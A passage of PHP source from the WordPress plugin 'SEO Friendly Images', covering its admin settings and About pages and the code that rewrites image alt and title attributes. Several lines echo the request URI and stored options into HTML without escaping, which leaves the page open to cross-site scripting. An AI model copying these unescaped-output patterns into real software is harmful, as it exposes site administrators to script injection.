			$form[$key]['domains'] = $rule['domains'];
			$form[$key]['options'] = $rule['options'];
			$form[$key]['options']['enable'] = ( $rule['options']['enable'] == 'on' ) ? 'checked' : '';
			if ( $key == 0 || $rule['options']['enable'] == 'on' ) {
				$form[$key]['options']['override_alt'] = ( $rule['options']['override_alt'] == 'on' ) ? 'checked' : '';
				$form[$key]['options']['override_title'] = ( $rule['options']['override_title'] == 'on' ) ?'checked' : '';
				$form[$key]['options']['strip_extension_title'] = ( $rule['options']['strip_extension_title'] == 'on' ) ?'checked' : '';
		
				$form[$key]['options']['external_links'] = ( $rule['options']['external_links'] == 'on' ) ? 'checked' : '';
			}
		}
	

		
		$imgpath = $this->plugin_url . '/i';
		$actionurl = $_SERVER['REQUEST_URI'];
		// Configuration Page
	?>
	<div class="wrap">
		<?php screen_icon(); ?>
		<h2><?php _e( 'SEO Friendly Images', 'seo-friendly-images' ); echo '&nbsp;' . $this->local_version; ?></h2>
		<a href="admin.php?page=sfi_settings"><?php _e( 'Settings', 'seo-friendly-images' ); ?></a> &nbsp; | &nbsp; <a href="admin.php?page=sfi_about"><?php _e( 'About', 'seo-friendly-images' ); ?></a>
		<div id="poststuff" style="margin-top:10px;">
		
			<div id="sideblock" style="float:right;width:270px;margin-left:10px;">		  
				<div class="ad">
					<a href="https://managewp.com/?utm_source=Plugins&amp;utm_medium=Banner&amp;utm_content=mwp250_2&amp;utm_campaign=SEOFriendlyImages" title="ManageWP.com - Manage your sites from one dashboard"><img src="<?php echo $imgpath ?>/mwp250_2.png" alt="ManageWP.com - Manage Multiple WordPress Sites"></a>
					</div><br>
				<div class="ad">
					<a target="_blank" href="http://www.prelovac.com/products/seo-smart-links"><img src="<?php echo $imgpath ?>/seosmart125.png" title="SEO Smart Links Premium" alt="SEO Smart Links Premium"></a>                                                                                                                      
					<a target="_blank" href="http://www.prelovac.com/products/seo-friendly-images"><img src="<?php echo $imgpath ?>/seoimages125_v2.jpg" title="SEO Friendly Images Premium" alt="SEO Friendly Images Premium"></a>                                                                                                                      
				</div> 
			</div>
		</div>
		<div id="mainblock" class="submit">
			<div class="dbx-content">
				<form name="sfiform" action="<?php echo $actionurl; ?>" method="post">
					<input type="hidden" name="submitted" value="1" />		 
					<p><?php _e( 'SEO Friendly Images automatically adds ALT and Title attributes to all your images in all your posts. Default options are usually good but you can change them below.', 'seo-friendly-images' ); ?></p>						 
					<p><strong><?php _e( 'Plugin supports several special tags:', 'seo-friendly-images' ); ?></strong></p>
					<ul>
						<li><b>%title</b> - <?php _e( 'replaces post title', 'seo-friendly-images' ); ?></li>
						<li><b>%desc</b> - <?php _e( 'replaces post excerpt', 'seo-friendly-images' ); ?></li>
						<li><b>%name</b> - <?php _e( 'replaces image file name ( without extension )', 'seo-friendly-images' ); ?></li>
						<li><b>%category</b> - <?php _e( 'replaces post category', 'seo-friendly-images' ); ?></li>
						<li><b>%tags</b> - <?php _e( 'replaces post tags', 'seo-friendly-images' ); ?></li>
					</ul>
					<p>
						<strong><?php _e( 'Example:', 'seo-friendly-images' ); ?></strong>
						<?php _e( 'In a post titled Car Pictures there is a picture named Ferrari.jpg', 'seo-friendly-images' ); ?><br /><br />
						<?php _e( 'Setting alt attribute to <b>"%name %title"</b> will produce alt="Ferrari Car Pictures"', 'seo-friendly-images' ); ?><br />
						<?php _e( 'Setting title attribute to <b>"%name photo"</b> will produce title="Ferrari photo"', 'seo-friendly-images' ); ?>
					</p>
					<div id="poststuff" class="postbox holder">
					<h3 class="hndle"><span><?php _e( 'Settings', 'seo-friendly-images' ); ?></span></h3>
					<div class="inside">
					
				
					<div id="defualt_settings" style="width:710px;" class="settings">
						<div id="default_alt_div">
							<label class="line" for="default_alt"><?php _e( 'Image <b>ALT</b> attribute:', 'seo-friendly-images' ); ?></label>
							<input class="regular-text" type="text" id="default_alt" name="default_alt" value="<?php echo $form[0]['options']['alt']; ?>" />
							<span class="description"><?php _e( 'example: %name %title', 'seo-friendly-images' ); ?></span>
						</div>
						<div id="default_title_div">
							<label class="line" for="default_title"><?php _e( 'Image <b>TITLE</b> attribute:', 'seo-friendly-images' ); ?></label>
							<input class="regular-text" type="text" id="default_title" name="default_title" value="<?php echo $form[0]['options']['title']; ?>" />
							<span class="description"><?php _e( 'example: %name photo', 'seo-friendly-images' ); ?></span>
						</div>
						<div id="default_override_div">
						<ul>
						<li>
							<label class="line" for="default_override_alt"><?php _e( 'Override default image alt tag', 'seo-friendly-images' ); ?></label>
							<input type="checkbox" id="default_override_alt" name="default_override_alt" <?php echo $form[0]['options']['override_alt']; ?> />
							<?php _e( '<span class="description">( recommended )</span>', 'seo-friendly-images' ); ?>
						</li>
						<li>
						<label class="line" for="default_override_title"><?php _e( 'Override default image title tag', 'seo-friendly-images' ); ?></label>
						<input type="checkbox" id="default_override_title" name="default_override_title" <?php echo $form[0]['options']['override_title']; ?> />
						</li>
						<li>
					<label class="line" for="default_strip_extension_title"><?php _e( 'Strip extension and delimiter characters (like dot dash etc) from the title tag', 'seo-friendly-images' ); ?></label>
					<input type="checkbox" id="default_strip_extension_title" name="default_strip_extension_title" <?php echo $form[0]['options']['strip_extension_title']; ?> />
						</li>
						
						</ul>
						</div>
					
					</div>
				</div>
				</div>
					<?php for ( $i = 1; $i < count( $form ) - 1; $i++ ): ?>
					<script type="text/javascript">
					jQuery( document ).ready( function( $){
						load_js(<?php echo $i; ?>, true );
					});
					</script>
					<div id="post-box" class="postbox holder">
					<div class="inside">
					<h4 class="big" id="title_rule_<?php echo $i; ?>"><?php echo __( 'Rule', 'seo-friendly-images' ) . ' ' . $i; ?></h4>
					<div id="rule_<?php echo $i; ?>_settings_div" style="width:710px;" class="settings">
						<div id="rule_<?php echo $i; ?>_domains_div" class="settings">
							<div id="rule_<?php echo $i; ?>_domain_main_all_div" class="settings settingstop">
								<div id="rule_<?php echo $i; ?>_domain_main_div" class="rew">
									<input type="checkbox" id="rule_<?php echo $i; ?>_domain_main" name="rule_<?php echo $i; ?>_domain_main" <?php echo ( in_array( 'main', $form[$i]['domains'] ) ) ? 'checked' : ''; ?> />
									<label for="rule_<?php echo $i; ?>_domain_main"><?php _e( 'Main Pages', 'seo-friendly-images' ); ?></label>
								</div>
								<div id="rule_<?php echo $i; ?>_subdomains_main_div">
									<input type="checkbox" id="rule_<?php echo $i; ?>_domain_home" name="rule_<?php echo $i; ?>_domain_home" <?php echo ( in_array( 'main', $form[$i]['domains'] ) || in_array( 'home', $form[$i]['domains'] ) ) ? 'checked' : ''; ?> <?php echo ( in_array( 'main', $form[$i]['domains'] ) ) ? 'disabled' : ''; ?> />
									<label for="rule_<?php echo $i; ?>_domain_home"><?php _e( 'Home Pages', 'seo-friendly-images' ); ?></label>
									<br />
									<input type="checkbox" id="rule_<?php echo $i; ?>_domain_front" name="rule_<?php echo $i; ?>_domain_front" <?php echo ( in_array( 'main', $form[$i]['domains'] ) || in_array( 'front', $form[$i]['domains'] ) ) ? 'checked' : ''; ?> <?php echo ( in_array( 'main', $form[$i]['domains'] ) ) ? 'disabled' : ''; ?> />
									<label for="rule_<?php echo $i; ?>_domain_front"><?php _e( 'Front Pages', 'seo-friendly-images' ); ?></label>
								</div>
								<div style="clear:both">
								</div>
							</div>
							<div id="rule_<?php echo $i; ?>_domain_archive_all_div" class="settings settingssec">
								<div id="rule_<?php echo $i; ?>_domain_archive_div">
									<input type="checkbox" id="rule_<?php echo $i; ?>_domain_archive" name="rule_<?php echo $i; ?>_domain_archive" <?php echo ( in_array( 'archive', $form[$i]['domains'] ) ) ? 'checked' : ''; ?> />
									<label for="rule_<?php echo $i; ?>_domain_archive"><?php _e( 'Archive Pages', 'seo-friendly-images' ); ?></label>
								</div>
								<br />
								<div id="rule_<?php echo $i; ?>_subdomains_archive_div">
									<div id="rule_<?php echo $i; ?>_domain_category_all_div" class="settings">
										<input type="checkbox" id="rule_<?php echo $i; ?>_domain_category" name="rule_<?php echo $i; ?>_domain_category" <?php echo ( in_array( 'archive', $form[$i]['domains'] ) || in_array( 'category', $form[$i]['domains'] ) ) ? 'checked' : ''; ?> <?php echo ( in_array( 'archive', $form[$i]['domains'] ) ) ? 'disabled' : ''; ?> />
										<label for="rule_<?php echo $i; ?>_domain_category"><?php _e( 'All Categories', 'seo-friendly-images' ); ?></label>
										<br />
										<div id="rule_<?php echo $i; ?>_domain_category_ids_div">
											<?php _e( 'or specify by IDs:', 'seo-friendly-images' ); ?>
											<br />
											<input class="regular-text smaller" type="text" id="rule_<?php echo $i; ?>_domain_category_ids" name="rule_<?php echo $i; ?>_domain_category_ids" value="<?php echo ( isset( $form[$i]['domains']['category'] ) ) ? implode( ',', $form[$i]['domains']['category'] ) : ''; ?>" />
										</div>
									</div>
									<div id="rule_<?php echo $i; ?>_domain_tag_all_div" class="settings">
										<input type="checkbox" id="rule_<?php echo $i; ?>_domain_tag" name="rule_<?php echo $i; ?>_domain_tag" <?php echo ( in_array( 'archive', $form[$i]['domains'] ) || in_array( 'tag', $form[$i]['domains'] ) ) ? 'checked' : ''; ?> <?php echo ( in_array( 'archive', $form[$i]['domains'] ) ) ? 'disabled' : ''; ?> />
										<label for="rule_<?php echo $i; ?>_domain_tag"><?php _e( 'All Tags', 'seo-friendly-images' ); ?></label>
										<br />
										<div id="rule_<?php echo $i; ?>_domain_tag_ids_div">
											<?php _e( 'or specify by IDs:', 'seo-friendly-images' ); ?>
											<br />
											<input class="regular-text smaller" type="text" id="rule_<?php echo $i; ?>_domain_tag_ids" name="rule_<?php echo $i; ?>_domain_tag_ids" value="<?php echo ( isset( $form[$i]['domains']['tag'] ) ) ? implode( ',', $form[$i]['domains']['tag'] ) : ''; ?>" />
										</div>
									</div>
									<div id="rule_<?php echo $i; ?>_domain_taxonomy_all_div" class="settings">
										<input type="checkbox" id="rule_<?php echo $i; ?>_domain_taxonomy" name="rule_<?php echo $i; ?>_domain_taxonomy" <?php echo ( in_array( 'archive', $form[$i]['domains'] ) || in_array( 'taxonomy', $form[$i]['domains'] ) ) ? 'checked' : ''; ?> <?php echo ( in_array( 'archive', $form[$i]['domains'] ) ) ? 'disabled' : ''; ?> />
										<label for="rule_<?php echo $i; ?>_domain_taxonomy"><?php _e( 'All Taxonomies', 'seo-friendly-images' ); ?></label>
										<br />
										<div id="rule_<?php echo $i; ?>_domain_taxonomy_ids_div">
											<?php _e( 'or specify by IDs:', 'seo-friendly-images' ); ?>
											<br />
											<input class="regular-text smaller" type="text" id="rule_<?php echo $i; ?>_domain_taxonomy_ids" name="rule_<?php echo $i; ?>_domain_taxonomy_ids"  value="<?php echo ( isset( $form[$i]['domains']['taxonomy'] ) ) ? implode( ',', $form[$i]['domains']['taxonomy'] ) : ''; ?>" />
										</div>
									</div>
									<div id="rule_<?php echo $i; ?>_domain_author_all_div" class="settings">
										<input type="checkbox" id="rule_<?php echo $i; ?>_domain_author" name="rule_<?php echo $i; ?>_domain_author" <?php echo ( in_array( 'archive', $form[$i]['domains'] ) || in_array( 'author', $form[$i]['domains'] ) ) ? 'checked' : ''; ?> <?php echo ( in_array( 'archive', $form[$i]['domains'] ) ) ? 'disabled' : ''; ?> />
										<label for="rule_<?php echo $i; ?>_domain_Author"><?php _e( 'All Authors', 'seo-friendly-images' ); ?></label>
										<br />
										<div id="rule_<?php echo $i; ?>_domain_author_ids_div">
											<?php _e( 'or specify by IDs:', 'seo-friendly-images' ); ?>
											<br />
											<input class="regular-text smaller" type="text" id="rule_<?php echo $i; ?>_domain_author_ids" name="rule_<?php echo $i; ?>_domain_author_ids"  value="<?php echo ( isset( $form[$i]['domains']['author'] ) ) ? implode( ',', $form[$i]['domains']['author'] ) : ''; ?>" />
										</div>
									</div>
									<div id="rule_<?php echo $i; ?>_domain_date_all_div" class="settings settingssec">
										<div id="rule_<?php echo $i; ?>_subdomains_date_div">
											<input type="checkbox" id="rule_<?php echo $i; ?>_domain_date" name="rule_<?php echo $i; ?>_domain_date" <?php echo ( in_array( 'archive', $form[$i]['domains'] ) || in_array( 'date', $form[$i]['domains'] ) ) ? 'checked' : ''; ?> <?php echo ( in_array( 'archive', $form[$i]['domains'] ) ) ? 'disabled' : ''; ?> />
											<label for="rule_<?php echo $i; ?>_domain_date"><?php _e( 'Date Pages', 'seo-friendly-images' ); ?></label>
										</div>
										<div id="rule_<?php echo $i; ?>_subdomains_date_div" class="settings">
											<input type="checkbox" id="rule_<?php echo $i; ?>_domain_year" name="rule_<?php echo $i; ?>_domain_year" <?php echo ( in_array( 'archive', $form[$i]['domains'] ) || in_array( 'date', $form[$i]['domains'] ) || in_array( 'year', $form[$i]['domains'] ) ) ? 'checked' : ''; ?> <?php echo ( in_array( 'archive', $form[$i]['domains'] ) || in_array( 'date', $form[$i]['domains'] ) ) ? 'disabled' : ''; ?> />
											<label for="rule_<?php echo $i; ?>_domain_year"><?php _e( 'Year Pages', 'seo-friendly-images' ); ?></label>
											<br />
											<input type="checkbox" id="rule_<?php echo $i; ?>_domain_month" name="rule_<?php echo $i; ?>_domain_month" <?php echo ( in_array( 'archive', $form[$i]['domains'] ) || in_array( 'date', $form[$i]['domains'] ) || in_array( 'month', $form[$i]['domains'] ) ) ? 'checked' : ''; ?> <?php echo ( in_array( 'archive', $form[$i]['domains'] ) || in_array( 'date', $form[$i]['domains'] ) ) ? 'disabled' : ''; ?> />
											<label for="rule_<?php echo $i; ?>_domain_month"><?php _e( 'Month Pages', 'seo-friendly-images' ); ?></label>
											<br />
											<input type="checkbox" id="rule_<?php echo $i; ?>_domain_day" name="rule_<?php echo $i; ?>_domain_day" <?php echo ( in_array( 'archive', $form[$i]['domains'] ) || in_array( 'date', $form[$i]['domains'] ) || in_array( 'day', $form[$i]['domains'] ) ) ? 'checked' : ''; ?> <?php echo ( in_array( 'archive', $form[$i]['domains'] ) || in_array( 'date', $form[$i]['domains'] ) ) ? 'disabled' : ''; ?> />
											<label for="rule_<?php echo $i; ?>_domain_day"><?php _e( 'Day Pages', 'seo-friendly-images' ); ?></label>
											<br />
											<input type="checkbox" id="rule_<?php echo $i; ?>_domain_time" name="rule_<?php echo $i; ?>_domain_time" <?php echo ( in_array( 'archive', $form[$i]['domains'] ) || in_array( 'date', $form[$i]['domains'] ) || in_array( 'time', $form[$i]['domains'] ) ) ? 'checked' : ''; ?> <?php echo ( in_array( 'archive', $form[$i]['domains'] ) || in_array( 'date', $form[$i]['domains'] ) ) ? 'disabled' : ''; ?> />
											<label for="rule_<?php echo $i; ?>_domain_time"><?php _e( 'Time Pages', 'seo-friendly-images' ); ?></label>
										</div>
										<div style="clear:both">
										</div>
									</div>
								</div>
								<div style="clear:both">
								</div>
							</div>
							<div id="rule_<?php echo $i; ?>_domain_singular_all_div" class="settings settingssec">
								<div id="rule_<?php echo $i; ?>_domain_singular_div">
									<input type="checkbox" id="rule_<?php echo $i; ?>_domain_singular" name="rule_<?php echo $i; ?>_domain_singular" <?php echo ( in_array( 'singular', $form[$i]['domains'] ) ) ? 'checked' : ''; ?> />
									<label for="rule_<?php echo $i; ?>_domain_singular"><?php _e( 'Singular Pages', 'seo-friendly-images' ); ?></label>
								</div>
								<br />
								<div id="rule_<?php echo $i; ?>_subdomains_singular_div">
									<div id="rule_<?php echo $i; ?>_domain_post_all_div" class="settings settingssec">
										<input type="checkbox" id="rule_<?php echo $i; ?>_domain_post" name="rule_<?php echo $i; ?>_domain_post" <?php echo ( in_array( 'singular', $form[$i]['domains'] ) || in_array( 'post', $form[$i]['domains'] ) ) ? 'checked' : ''; ?> />
										<label for="rule_<?php echo $i; ?>_domain_post"><?php _e( 'All Posts', 'seo-friendly-images' ); ?></label>
										<br />
										<div id="rule_<?php echo $i; ?>_domain_post_ids_div">
											<?php _e( 'or specify by IDs:', 'seo-friendly-images' ); ?>
											<br />
											<input class="regular-text smaller" type="text" id="rule_<?php echo $i; ?>_domain_post_ids" name="rule_<?php echo $i; ?>_domain_post_ids"  value="<?php echo ( isset( $form[$i]['domains']['post'] ) ) ? implode( ',', $form[$i]['domains']['post'] ) : ''; ?>" />
										</div>
									</div>
									<div id="rule_<?php echo $i; ?>_domain_page_all_div" class="settings settingssec">
										<input type="checkbox" id="rule_<?php echo $i; ?>_domain_page" name="rule_<?php echo $i; ?>_domain_page" <?php echo ( in_array( 'singular', $form[$i]['domains'] ) || in_array( 'page', $form[$i]['domains'] ) ) ? 'checked' : ''; ?> />
										<label for="rule_<?php echo $i; ?>_domain_page"><?php _e( 'All Pages', 'seo-friendly-images' ); ?></label>
										<br />
										<div id="rule_<?php echo $i; ?>_domain_page_ids_div">
											<?php _e( 'or specify by IDs:', 'seo-friendly-images' ); ?>
											<br />
											<input class="regular-text smaller" type="text" id="rule_<?php echo $i; ?>_domain_page_ids" name="rule_<?php echo $i; ?>_domain_page_ids" value="<?php echo ( isset( $form[$i]['domains']['page'] ) ) ? implode( ',', $form[$i]['domains']['page'] ) : ''; ?>" />
										</div>
									</div>
									<div id="rule_<?php echo $i; ?>_domain_attachment_all_div" class="settings settingssec">
										<input type="checkbox" id="rule_<?php echo $i; ?>_domain_attachment" name="rule_<?php echo $i; ?>_domain_attachment" <?php echo ( in_array( 'singular', $form[$i]['domains'] ) || in_array( 'attachment', $form[$i]['domains'] ) ) ? 'checked' : ''; ?> />
										<label for="rule_<?php echo $i; ?>_domain_attachment"><?php _e( 'All Attachments', 'seo-friendly-images' ); ?></label>
										<br />
										<div id="rule_<?php echo $i; ?>_domain_attachment_ids_div">
											<?php _e( 'or specify by IDs:', 'seo-friendly-images' ); ?>
											<br />
											<input class="regular-text smaller" type="text" id="rule_<?php echo $i; ?>_domain_attachment_ids" name="rule_<?php echo $i; ?>_domain_attachment_ids" value="<?php echo ( isset( $form[$i]['domains']['attachment'] ) ) ? implode( ',', $form[$i]['domains']['attachment'] ) : ''; ?>" />
										</div>
									</div>
								</div>
								<div style="clear:both">
								</div>
							</div>
						</div>
						<input type="hidden" id="rule_<?php echo $i; ?>_hidden" name="rule_<?php echo $i; ?>_hidden" value="1" />
						<br />
					   <ul class="radios">
					   <li>
						<input type="radio" id="rule_<?php echo $i; ?>_enable" name="rule_<?php echo $i; ?>_enable" value="enabled" <?php echo $form[$i]['options']['enable']; ?> /> <label>Enable plugin for the above rules</label>
						</li>
						<li>
						<input type="radio" id="rule_<?php echo $i; ?>_enable" name="rule_<?php echo $i; ?>_enable" value="disabled" <?php echo ( ( $form[$i]['options']['enable'] == "" ) ? "checked" : "" ); ?> /> <label>Disable plugin for the above rules</label></li>
						</ul>
						<br />
						
						<div id="rule_<?php echo $i; ?>_rules_div" <?php echo ( ( $form[$i]['options']['enable'] == 'checked' ) ? "" : "style='display:none;'" ); ?> >
							<div id="rule_<?php echo $i; ?>_alt_div" class="rule">
								<label class="line2" for="rule_<?php echo $i; ?>_alt"><?php _e( 'Image <b>ALT</b> attribute:', 'seo-friendly-images' ); ?></label>
								<input class="regular-text" type="text" id="rule_<?php echo $i; ?>_alt" name="rule_<?php echo $i; ?>_alt" value="<?php echo ( isset( $form[$i]['options']['alt'] ) ) ? $form[$i]['options']['alt'] : '%name %title'; ?>" />
								<span class="description"><?php _e( 'example: %name %title', 'seo-friendly-images' ); ?></span>
							</div>
							<div id="rule_<?php echo $i; ?>_title_div" class="rule">
								<label class="line2" for="rule_<?php echo $i; ?>_title"><?php _e( 'Image <b>TITLE</b> attribute:', 'seo-friendly-images' ); ?></label>
								<input class="regular-text" type="text" id="rule_<?php echo $i; ?>_title" name="rule_<?php echo $i; ?>_title" value="<?php echo ( isset( $form[$i]['options']['title'] ) ) ? $form[$i]['options']['title'] : '%name photo'; ?>" />
								<span class="description"><?php _e( 'example: %name photo', 'seo-friendly-images' ); ?></span>
							</div>
							<div id="rule_<?php echo $i; ?>_override_div" class="rule">
							<ul class="lists">
							<li>
								<label class="line2" for="rule_<?php echo $i; ?>_override_alt"><?php _e( 'Override default image alt tag', 'seo-friendly-images' ); ?></label>
								<input type="checkbox" id="rule_<?php echo $i; ?>_override_alt" name="rule_<?php echo $i; ?>_override_alt" <?php echo ( isset( $form[$i]['options']['override_alt'] ) ) ? $form[$i]['options']['override_alt'] : 'checked'; ?> />
								<span class="description"><?php _e( '( recommended )', 'seo-friendly-images' ); ?></span>
							</li>
							<li>
								<label class="line2" for="rule_<?php echo $i; ?>_override_title"><?php _e( 'Override default image title tag', 'seo-friendly-images' ); ?></label>
								<input type="checkbox" name="rule_<?php echo $i; ?>_override_title" id="rule_<?php echo $i; ?>_override_title" <?php echo ( isset( $form[$i]['options']['override_title'] ) ? $form[$i]['options']['override_title'] : '' ); ?> />
							</li>
							<li>
								<label class="line2" for="rule_<?php echo $i; ?>_strip_extension_title"><?php _e( 'Strip extension and delimiter characters from title tag', 'seo-friendly-images' ); ?></label>
								<input type="checkbox" name="rule_<?php echo $i; ?>_strip_extension_title" id="rule_<?php echo $i; ?>_strip_extension_title" <?php echo ( isset( $form[$i]['options']['strip_extension_title'] ) ? $form[$i]['options']['strip_extension_title'] : '' ); ?> />

							</li>
							
							</ul>								
							</div>
							<br />
							
						</div>
					</div>
				</div>
				</div>
					<?php endfor; ?>
					
					<div style="padding: 1.5em 0;margin: 5px 0;">
						<input type="submit" name="Submit" value="<?php _e( 'Update options', 'seo-friendly-images' ); ?>" />
					</div>
				</form>
				<div id="rule_copy" style="display:none;"><?php echo $this->create_rule_html( 'number' ); ?></div>
			</div> 
		</div>
		<h5><?php _e( 'Another fine WordPress plugin by', 'seo-friendly-images' ); ?> <a href="http://www.prelovac.com/vladimir/">Vladimir Prelovac</a></h5>
	</div>
	<?php	
	}
	

	
	function handle_about() {
		global $wp_version;
		
		$upd_msg = "";
		
		$actionurl = $_SERVER['REQUEST_URI'];
		$nonce = wp_create_nonce( 'seo-smart-links' );
		
		$imgpath = $this->plugin_url . '/i';
		$lic_msg = '<p>Welcome to ' . $this->name . '.</p><p>Thank you for using my plugin, if you find it useful please <a href="https://wordpress.org/plugins/seo-image/">rate it</a>.</p>';
	?>
	<div class="wrap">
		<?php screen_icon(); ?>
		<h2><?php _e( 'SEO Friendly Images', 'seo-friendly-images' ); echo '&nbsp;' . $this->local_version; ?></h2>
		<a href="admin.php?page=sfi_settings"><?php _e( 'Settings', 'seo-friendly-images' ); ?></a> &nbsp;|&nbsp; <a href="admin.php?page=sfi_about"><?php _e( 'About', 'seo-friendly-images' ); ?></a>
		<div id="poststuff" style="margin-top:10px;">
		
			<div id="sideblock" style="float:right;width:270px;margin-left:10px;">		  
					<div class="ad">
					<a href="https://managewp.com/?utm_source=Plugins&amp;utm_medium=Banner&amp;utm_content=mwp250_2&amp;utm_campaign=SEOFriendlyImages" title="ManageWP.com - Manage your sites from one dashboard"><img src="<?php echo $imgpath ?>/mwp250_2.png" alt="ManageWP.com - Manage Multiple WordPress Sites"></a>
					</div><br>
				<div class="ad">
					<a target="_blank" href="http://www.prelovac.com/products/seo-smart-links"><img src="<?php echo $imgpath ?>/seosmart125.png" title="SEO Smart Links Premium" alt="SEO Smart Links Premium"></a>                                                                                                                      
					<a target="_blank" href="http://www.prelovac.com/products/seo-friendly-images"><img src="<?php echo $imgpath ?>/seoimages125_v2.jpg" title="SEO Friendly Images Premium" alt="SEO Friendly Images Premium"></a>                                                                                                                      
				</div> 
			</div>
		</div>
		<div id="mainblock" class="submit">
			<div class="dbx-content">				
				<h2><?php _e( 'About', 'seo-friendly-images' ); ?></h2>
				<br />
				<form name="SEOLinks_about" action="$actionurl" method="post">
					<input type="hidden" id="_wpnonce" name="_wpnonce" value="$nonce" />
					<input type="hidden" name="submitted" value="1" /> 			
					<?php echo $lic_msg; ?>
					<?php echo __( 'Version:', 'seo-friendly-images' ) . $this->local_version; ?> <?php echo $upd_msg; ?>
				</form>
			</div>   
		</div>
		<h5><?php _e( 'Another fine WordPress plugin by', 'seo-friendly-images' ); ?> <a href="http://www.prelovac.com/vladimir/">Vladimir Prelovac</a></h5>
	</div>
	<?php
	}
	
	function remove_extension( $name ) {
		return preg_replace( '/(.+)\..*$/', '$1', $name );
	}
	
	function seo_friendly_images_process( $matches ) {
		global $post;
		
		$alttext_rep = $this->process_parameters["alt"];
		$titletext_rep = $this->process_parameters["title"];
		$override_alt = $this->process_parameters["override_alt"];
		$override_title = $this->process_parameters["override_title"];
		$strip_extension_title = $this->process_parameters["strip_extension_title"];
		
		$title = $post->post_title;
		
		# take care of unusual endings
		$matches[0] = preg_replace( '|([\'"])[/ ]*$|', '\1 /', $matches[0] );
		
		### Normalize spacing around attributes.
		$matches[0] = preg_replace( '/\s*=\s*/', '=', substr( $matches[0], 0, strlen( $matches[0] ) - 2 ) );
		### Get source.
		
		preg_match( '/src\s*=\s*([\'"])?((?(1).+?|[^\s>]+))(?(1)\1)/', $matches[0], $source );
		
		$saved = $source[2];
		
		### Swap with file's base name.
		preg_match( '%[^/]+(?=\.[a-z]{3}(\z|(?=\?)))%', $source[2], $source );
		### Separate URL by attributes.
		$pieces = preg_split( '/(\w+=)/', $matches[0], -1, PREG_SPLIT_DELIM_CAPTURE | PREG_SPLIT_NO_EMPTY );
		### Add missing pieces.
		
		$tags = "";
		if ( strrpos( $alttext_rep, "%tags" ) !== false || strrpos( $titletext_rep, "%tags" ) !== false ) {
			$posttags = get_the_tags();		
			
			if ( $posttags ) {
				$i = 0;
				foreach ( $posttags as $tag ) {
					if ( $i == 0 ) {
						$tags = $tag->name . $tags;
					} else {
						$tags = $tag->name . ' ' . $tags;
					}
					++$i;
				}
			}
		}
		
		$cats = "";
		if ( strrpos( $alttext_rep, "%category" ) !== false || strrpos( $titletext_rep, "%category" ) !== false ) {
			$categories = get_the_category();
			
			if ( $categories ) {
				$i = 0;
				foreach ( $categories as $cat ) {
					if ( $i == 0 ) {
						$cats = $cat->slug . $cats;
					} else {
						$cats = $cat->slug . ' ' . $cats;
					}
					++$i;
				}
			}
		}
		
		if ( $override_title == "on" || !in_array('alt=', $pieces)) {
			$titletext_rep = str_replace("%title", $post->post_title, $titletext_rep );
			$titletext_rep = str_replace("%name", $source[0], $titletext_rep );
			$titletext_rep = str_replace("%category", $cats, $titletext_rep );
			$titletext_rep = str_replace("%tags", $tags, $titletext_rep );
			$titletext_rep = str_replace("%desc", $post->post_excerpt, $titletext_rep);
			
			if ( $strip_extension_title == "on" ) {
				$titletext_rep = str_replace( '"', '', $titletext_rep );
				$titletext_rep = str_replace("'", "", $titletext_rep );			
				$titletext_rep = str_replace("_", " ", $titletext_rep );
				$titletext_rep = str_replace("-", " ", $titletext_rep );
			}
			
			//$titletext_rep = ucwords( strtolower( $titletext_rep ) );
			if ( ! in_array( 'title=', $pieces ) ) {
				array_push( $pieces, ' title="' . $titletext_rep . '"' );
			} else {
				$index			  = array_search( 'title=', $pieces );
				$pieces[$index + 1] = '"' . $titletext_rep . '" ';
			}
		}
		if ( $override_alt == "on" || !in_array('alt=', $pieces)) {
			$alttext_rep = str_replace("%title", $post->post_title, $alttext_rep );
			$alttext_rep = str_replace("%name", $source[0], $alttext_rep );
			$alttext_rep = str_replace("%category", $cats, $alttext_rep );
			$alttext_rep = str_replace("%tags", $tags, $alttext_rep );
			$alttext_rep = str_replace("%desc", $post->post_excerpt, $alttext_rep);
			$alttext_rep = str_replace("\"", "", $alttext_rep );
			$alttext_rep = str_replace("'", "", $alttext_rep );
			
			$alttext_rep = ( str_replace("-", " ", $alttext_rep ) );
			$alttext_rep = ( str_replace("_", " ", $alttext_rep ) );
			
			if ( ! in_array( 'alt=', $pieces ) ) {
				array_push( $pieces, ' alt="' . $alttext_rep . '"' );
			} else {
				$index			  = array_search( 'alt=', $pieces );
				$pieces[$index + 1] = '"' . $alttext_rep . '" ';
			}
		}
		
		return implode( '', $pieces ) . ' /';
	}   
	
	function get_proper_options() {
		$options = null;
		
		if ( is_home() ) {
			if ( $this->tree["main"]["home"]["options"] != null ) {
				$options = $this->tree["main"]["home"]["options"];
			} elseif ( $this->tree["main"]["options"] != null ) {
				$options = $this->tree["main"]["options"];
			} else {
				$options = $this->tree["all"]["options"];
			}
		} elseif ( is_front_page() ) {
			if ( $this->tree["main"]["front"]["options"] != null ) {
				$options = $this->tree["main"]["front"]["options"];
			} elseif ( $this->tree["main"]["options"] != null ) {
				$options = $this->tree["main"]["options"];
			} else {
				$options = $this->tree["all"]["options"];
			}
		} elseif ( is_category() ) {
			$cur_category_id = get_cat_id( single_cat_title("",false ) );
			$found = false;
			$found_group = null;
			foreach ( $this->tree["archive"]["category"] as $key => $group ) {
				if ( $key != 'options' ) {
					$found = $found || in_array( $cur_category_id, $group["ids"] );
					if ( in_array( $cur_category_id, $group["ids"] ) ) {
						$found_group = $key;
					}
				}
			}
			if ( $found ) {
				$options = $this->tree["archive"]["category"][$found_group]["options"];
			} elseif ( $this->tree["archive"]["category"]["options"] != null ) {
				$options = $this->tree["archive"]["category"]["options"];
			} elseif ( $this->tree["archive"]["options"] != null ) {
				$options = $this->tree["archive"]["options"];
			} else {
				$options = $this->tree["all"]["options"];
			}
		} elseif ( is_tag() ) {
			$cur_tag_title = single_tag_title("",false );
			$tag = get_term_by( 'name', $cur_tag_title, 'post_tag' );
			if ( $tag ) {
				$cur_tag_id = $tag->term_id;
			} else {
				$cur_tag_id = 0;
			}
			$found = false;
			$found_group = null;
			foreach ( $this->tree["archive"]["tag"] as $key => $group ) {
				if ( $key != 'options' ) {
					$found = $found || in_array( $cur_tag_id, $group["ids"] );
					if ( in_array( $cur_tag_id, $group["ids"] ) ) {
						$found_group = $key;
					}
				}
			}
			if ( $found ) {
				$options = $this->tree["archive"]["tag"][$found_group]["options"];
			} elseif ( $this->tree["archive"]["tag"]["options"] != null ) {
				$options = $this->tree["archive"]["tag"]["options"];
			} elseif ( $this->tree["archive"]["options"] != null ) {
				$options = $this->tree["archive"]["options"];
			} else {
